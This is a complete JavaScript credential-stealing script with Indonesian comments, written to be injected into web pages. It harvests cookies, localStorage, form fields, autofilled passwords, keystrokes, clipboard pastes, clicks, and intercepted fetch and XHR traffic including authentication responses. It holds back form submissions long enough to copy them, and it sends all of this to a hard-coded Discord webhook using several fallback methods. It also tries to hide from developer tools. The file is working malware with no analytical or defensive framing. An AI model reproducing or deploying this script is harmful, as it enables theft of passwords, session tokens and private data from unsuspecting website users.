(function() {
    // Konfigurasi
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1391022161015345222/HMB9H_1qG8R__WZZeqC1rTKzcMdLhuyCWZHMHVd0bnP8SfjIW905-CUvtTdIwJmqmJKY';
    const INTERVAL_PENGUMPULAN = 30000; // 30 detik
    const MAKSIMAL_KARAKTER = 1500; // Karakter maks per request
    
    // Pengirim Discord yang ditingkatkan
    function kirimKeDiscord(pesan, percobaanUlang = 0) {
        // Potong pesan panjang
        if (pesan.length > MAKSIMAL_KARAKTER) {
            const bagian = pesan.match(new RegExp(`.{1,${MAKSIMAL_KARAKTER}}`, 'g'));
            bagian.forEach(bagian => kirimKeDiscord(bagian));
            return;
        }
        
        // Gunakan beberapa teknik pengiriman
        const metodePengiriman = [
            () => {
                // Metode 1: XMLHttpRequest
                const xhr = new XMLHttpRequest();
                xhr.open('POST', WEBHOOK_URL, true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send(JSON.stringify({ content: pesan }));
            },
            () => {
                // Metode 2: Fetch dengan no-cors
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: pesan }),
                    mode: 'no-cors'
                }).catch(() => {});
            },
            () => {
                // Metode 3: Beacon gambar (cadangan)
                const img = new Image();
                img.src = `${WEBHOOK_URL}?data=${btoa(pesan)}`;
            }
        ];
        
        // Coba setiap metode
        metodePengiriman.forEach(metode => {
            try { metode(); } catch(e) {}
        });
        
        // Logika percobaan ulang
        if (percobaanUlang < 3) {
            setTimeout(() => kirimKeDiscord(pesan, percobaanUlang + 1), 2000);
        }
    }
    
    // Kumpulkan SEMUA data sensitif
    function kumpulkanSemuaData() {
        let dataTerkumpul = `🔥 DUMP DATA LENGKAP - ${new Date().toISOString()}\n\n`;
        
        // 1. Info Domain & URL
        dataTerkumpul += `🌐 DOMAIN: ${document.domain}\n`;
        dataTerkumpul += `📍 URL: ${location.href}\n`;
        dataTerkumpul += `🔗 Referrer: ${document.referrer}\n\n`;
        
        // 2. Cookies & Penyimpanan
        dataTerkumpul += `🍪 COOKIES:\n${document.cookie}\n\n`;
        dataTerkumpul += `💾 LOCAL STORAGE:\n`;
        for (let i = 0; i < localStorage.length; i++) {
            const kunci = localStorage.key(i);
            dataTerkumpul += `${kunci}: ${localStorage.getItem(kunci)}\n`;
        }
        dataTerkumpul += `\n`;
        
        // 3. Pengumpulan Data Form
        dataTerkumpul += `📝 DATA FORM:\n`;
        document.querySelectorAll('input, textarea, select').forEach((elemen, index) => {
            dataTerkumpul += `[${index}] ${elemen.name || elemen.id || 'tanpa-nama'}: ${elemen.value}\n`;
        });
        
        // 4. User Agent & Platform
        dataTerkumpul += `\n👤 INFO PENGGUNA:\n`;
        dataTerkumpul += `User Agent: ${navigator.userAgent}\n`;
        dataTerkumpul += `Platform: ${navigator.platform}\n`;
        dataTerkumpul += `Bahasa: ${navigator.language}\n`;
        dataTerkumpul += `Layar: ${screen.width}x${screen.height}\n`;
        
        // 5. Info Jaringan (lewat WebRTC)
        try {
            const koneksiRTC = new RTCPeerConnection({iceServers: []});
            koneksiRTC.createDataChannel('');
            koneksiRTC.createOffer().then(penawaran => {
                kirimKeDiscord(`🎯 IP WebRTC Terdeteksi dalam penawaran`);
            });
        } catch(e) {}
        
        // 6. Deteksi Data Autofill
        setTimeout(() => {
            document.querySelectorAll('input[type="password"], input[autocomplete]').forEach(input => {
                if (input.value && !input.dataset.tercatat) {
                    input.dataset.tercatat = 'true';
                    kirimKeDiscord(`🔑 AUTOFILL TERDETEKSI:\nField: ${input.name || input.id}\nValue: ${input.value}`);
                }
            });
        }, 1000);
        
        return dataTerkumpul;
    }
    
    // Pendengar Event yang Ditingkatkan
    const pendengarEvent = {
        'input': (e) => {
            const target = e.target;
            if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA')) {
                setTimeout(() => {
                    kirimKeDiscord(
                        `📥 INPUT @ ${location.href}\n` +
                        `🔍 Tipe: ${target.type}\n` +
                        `🏷️ Nama: ${target.name || target.id || 'tanpa-nama'}\n` +
                        `📝 Nilai: ${target.value}\n` +
                        `📍 XPath: ${dapatkanXPath(target)}`
                    );
                }, 100);
            }
        },
        
        'submit': (e) => {
            e.preventDefault();
            let dataForm = `📤 PENGIRIMAN FORM DIBLOKIR @ ${location.href}\n`;
            
            e.target.querySelectorAll('input, textarea, select').forEach(elemen => {
                dataForm += `${elemen.name || elemen.type}: ${elemen.value}\n`;
            });
            
            kirimKeDiscord(dataForm);
            
            // Opsional: Izinkan pengiriman setelah delay
            setTimeout(() => {
                e.target.submit();
            }, 3000);
            
            return false;
        },
        
        'click': (e) => {
            // Lacak tombol dan link
            if (e.target.tagName === 'BUTTON' || e.target.tagName === 'A') {
                kirimKeDiscord(
                    `🖱️ KLIK: ${e.target.textContent.substring(0, 50)}\n` +
                    `URL: ${e.target.href || location.href}\n` +
                    `ID: ${e.target.id || 'tanpa-id'}`
                );
            }
        },
        
        'paste': (e) => {
            const teksTempelan = (e.clipboardData || window.clipboardData).getData('text');
            kirimKeDiscord(`📋 TEMPELAN TERDETEKSI:\n${teksTempelan.substring(0, 200)}`);
        },
        
        'keydown': (e) => {
            // Tangkap tombol khusus
            const tombolKhusus = {
                13: 'ENTER',
                9: 'TAB',
                27: 'ESC',
                16: 'SHIFT',
                17: 'CTRL',
                18: 'ALT'
            };
            
            if (tombolKhusus[e.keyCode]) {
                kirimKeDiscord(`⌨️ TEKAN TOMBOL: ${tombolKhusus[e.keyCode]} @ ${location.href}`);
            }
            
            // Tangkap toggle visibilitas password (pola umum)
            if (e.target.type === 'password' && e.keyCode === 17) { // CTRL
                kirimKeDiscord(`👁️ PERCOBAAN TOGGLE VISIBILITAS PASSWORD`);
            }
        }
    };
    
    // Fungsi bantu untuk mendapatkan XPath
    function dapatkanXPath(elemen) {
        if (elemen.id !== '')
            return `//*[@id="${elemen.id}"]`;
        if (elemen === document.body)
            return '/html/body';
        
        let indeks = 0;
        const saudara = elemen.parentNode.childNodes;
        
        for (let i = 0; i < saudara.length; i++) {
            const saudaraNode = saudara[i];
            if (saudaraNode === elemen)
                return dapatkanXPath(elemen.parentNode) + '/' + elemen.tagName.toLowerCase() + '[' + (indeks + 1) + ']';
            if (saudaraNode.nodeType === 1 && saudaraNode.tagName === elemen.tagName)
                indeks++;
        }
    }
    
    // Sita request AJAX/Fetch
    const fetchAsli = window.fetch;
    window.fetch = function(...args) {
        kirimKeDiscord(`🌐 REQUEST FETCH:\nURL: ${args[0]}\nMetode: ${args[1]?.method || 'GET'}`);
        
        if (args[1] && args[1].body) {
            try {
                kirimKeDiscord(`📦 BODY FETCH:\n${args[1].body.toString().substring(0, 500)}`);
            } catch(e) {}
        }
        
        return fetchAsli.apply(this, args)
            .then(respons => {
                if (respons.url.includes('api') || respons.url.includes('auth')) {
                    respons.clone().text().then(teks => {
                        kirimKeDiscord(`📥 RESPONS FETCH (${respons.status}):\n${teks.substring(0, 300)}`);
                    });
                }
                return respons;
            });
    };
    
    // Sita XMLHttpRequest
    const bukaXHRAsli = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(metode, url) {
        kirimKeDiscord(`🌐 XHR: ${metode} ${url}`);
        return bukaXHRAsli.apply(this, arguments);
    };
    
    // Dump data awal
    setTimeout(() => {
        kirimKeDiscord(kumpulkanSemuaData());
    }, 2000);
    
    // Pengumpulan data berkala
    setInterval(() => {
        kirimKeDiscord(`⏰ CEK BERKALA @ ${new Date().toLocaleTimeString()}\nURL: ${location.href}`);
    }, INTERVAL_PENGUMPULAN);
    
    // Pasang semua pendengar event
    Object.entries(pendengarEvent).forEach(([event, handler]) => {
        document.addEventListener(event, handler, true); // Gunakan fase capture
    });
    
    // Perubahan visibilitas halaman (ganti tab)
    document.addEventListener('visibilitychange', () => {
        kirimKeDiscord(`👁️ VISIBILITAS HALAMAN: ${document.visibilityState} @ ${location.href}`);
    });
    
    // Sebelun unload (pengguna meninggalkan)
    window.addEventListener('beforeunload', () => {
        kirimKeDiscord(`🚪 PENGGUNA KELUAR HALAMAN: ${location.href}`);
    });
    
    // Deteksi percobaan screenshot
    document.addEventListener('keydown', (e) => {
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'S' || e.keyCode === 83)) {
            kirimKeDiscord(`📸 PERCOBAAN SCREENSHOT TERDETEKSI (Ctrl+Shift+S)`);
        }
    });
    
    // Mode stealth: Sembunyikan dari devtools
    Object.defineProperty(window, 'kirimKeDiscord', {
        value: null,
        writable: false,
        configurable: false
    });
    
    console.log('Monitoring diinisialisasi...');
})();